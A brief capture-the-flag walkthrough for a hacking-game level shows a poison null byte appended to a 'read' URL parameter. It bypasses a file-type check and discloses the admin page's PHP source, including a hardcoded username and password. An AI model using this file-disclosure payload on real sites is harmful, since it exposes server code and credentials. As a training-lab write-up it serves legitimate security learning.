#### Level 08 - The poet

The first thing we see is that files is included raw from the URL.

At the admin page, the URL looks like this:
http://www.hacmegame.org/hacmegame/challenges/ChallengeS30.html?include=admin.php

At the other pages, the URL looks like this:
http://www.hacmegame.org/hacmegame/challenges/ChallengeS30.html?read=poem3.html

So why not try ?read=admin.php

"Illegal file type - I don't like you." Ups :/

Smells like poison nullbyte, so lets try this then: ?read=admin.php%00.html

```php
<?php

session_start();
if ($_SESSION['authenticated'] || $_POST['username'] == 'brezhnev' && $_POST['password'] == 'c2SIdZX5') {
   $_SESSION['authenticated'] = true;
   printAdminForm();
} else {
   printLoginForm();
}

?>
```

Yeap. That easy.

To read more about poison nullbyte: http://insecure.org/news/P55-07.txt
